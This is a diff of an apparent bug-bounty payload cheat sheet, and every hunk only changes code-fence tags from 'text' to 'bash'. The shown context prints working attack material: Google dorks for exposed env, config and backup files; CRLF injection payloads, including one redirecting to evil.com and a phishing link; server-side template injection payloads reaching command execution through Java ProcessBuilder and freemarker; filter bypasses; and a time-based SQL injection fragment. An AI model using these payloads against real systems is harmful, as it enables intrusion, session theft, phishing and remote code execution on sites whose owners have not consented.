@@ -295,7 +295,7 @@ ffuf -request xss -request-proto https
 ### Basic Domain Reconnaissance
 *Basic domain enumeration using Google dorks*
 
-```text
+```bash
 site:example.com -www -shop -share -ir -mfa
 site:example.com ext:php inurl:?
 site:example.com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
@@ -304,7 +304,7 @@ site:example.com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
 ### Sensitive File Extensions
 *Search for potentially sensitive file extensions*
 
-```text
+```bash
 site:'example.com' ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json
 inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example.com
 ```
@@ -312,14 +312,14 @@ inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:
 ### Error Pages and Exceptions
 *Find pages exposing error messages or exceptions*
 
-```text
+```bash
 inurl:'error' | intitle:'exception' | intitle:'failure' | intitle:'server at' | inurl:exception | 'database error' | 'SQL syntax' | 'undefined index' | 'unhandled exception' | 'stack trace' site:example.com
 ```
 
 ### Vulnerability-Prone Parameters
 *Search for potentially vulnerable parameters*
 
-```text
+```bash
 inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com
 inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com
 inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com
@@ -331,7 +331,7 @@ inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | 
 ### Cloud Storage and Services
 *Find exposed cloud storage and services*
 
-```text
+```bash
 site:s3.amazonaws.com 'example.com'
 site:blob.core.windows.net 'example.com'
 site:googleapis.com 'example.com'
@@ -352,7 +352,7 @@ site:firebaseio.com 'example.com'
 ### Code and Documentation
 *Search for exposed code and documentation*
 
-```text
+```bash
 site:pastebin.com 'example.com'
 site:jsfiddle.net 'example.com'
 site:codebeautify.org 'example.com'
@@ -365,7 +365,7 @@ site:groups.google.com 'example.com'
 ### Sensitive Content
 *Find potentially sensitive content*
 
-```text
+```bash
 site:example.com 'choose file'
 inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example.com
 inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:example.com
@@ -512,37 +512,37 @@ if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(
 ### Payloads
 
 #### Basic injection payload to test for CRLF vulnerabilities (extra headers/HTML)
-```text
+```bash
 %0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
 ```
 
 #### Bypass headers like X-XSS-Protection and inject scripts
-```text
+```bash
 %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
 ```
 
 #### Redirect victim via injected response
-```text
+```bash
 %0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
 ```
 
 #### Script execution in SVG with crafted Content-Length
-```text
+```bash
 %0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a%0d%0a/%2f%2e%2e
 ```
 
 #### Image onerror prompt
-```text
+```bash
 %0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
 ```
 
 #### Full-screen iframe overlay
-```text
+```bash
 %0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
 ```
 
 #### Phishing anchor
-```text
+```bash
 %0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
 ```
 
@@ -559,7 +559,7 @@ if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(
 ### Basic Template Detection
 *Initial payloads to detect template injection vulnerabilities*
 
-```text
+```bash
 [=7*7]
 {7*7}
 *{7*7}
@@ -584,7 +584,7 @@ ${{3*3}}
 ### Information Disclosure
 *Payloads to extract configuration and application data*
 
-```text
+```bash
 {{dump(app)}}
 {{app.request.server.all|join(',')}}
 {{config.items()}}
@@ -599,7 +599,7 @@ ${{3*3}}
 ### Python-Specific Exploits
 *Payloads targeting Python-based template engines*
 
-```text
+```bash
 {{ [].class.base.subclasses() }}
 {{''.class.mro()[1].subclasses()}}
 {{ ''.class.mro[2].subclasses() }}
@@ -614,7 +614,7 @@ ${{3*3}}
 ### Java Template Exploits
 *Payloads specifically for Java-based template engines*
 
-```text
+```bash
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"netstat\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
@@ -627,7 +627,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ### Filter Bypass Techniques
 *Advanced payloads for bypassing security filters*
 
-```text
+```bash
 {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
 {{request|attr(["_"*2,"class","_"*2]|join)}}
 {{request|attr(["","class",""]|join)}}
@@ -661,7 +661,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ### Commands
 
 #### VirusTotal — Domain report (subdomains, IPs)
-```text
+```bash
 https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>
 ```
 
@@ -686,12 +686,12 @@ curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r
 ```
 
 #### Wayback Machine — Historical URLs
-```text
+```bash
 https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey
 ```
 
 #### Shodan — Search by favicon hash
-```text
+```bash
 http.favicon.hash:1265477436
 ```
 
@@ -759,7 +759,7 @@ curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | gre
 ```
 
 #### 14) Info disclosure dorks
-```text
+```bash
 site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
 ```
 
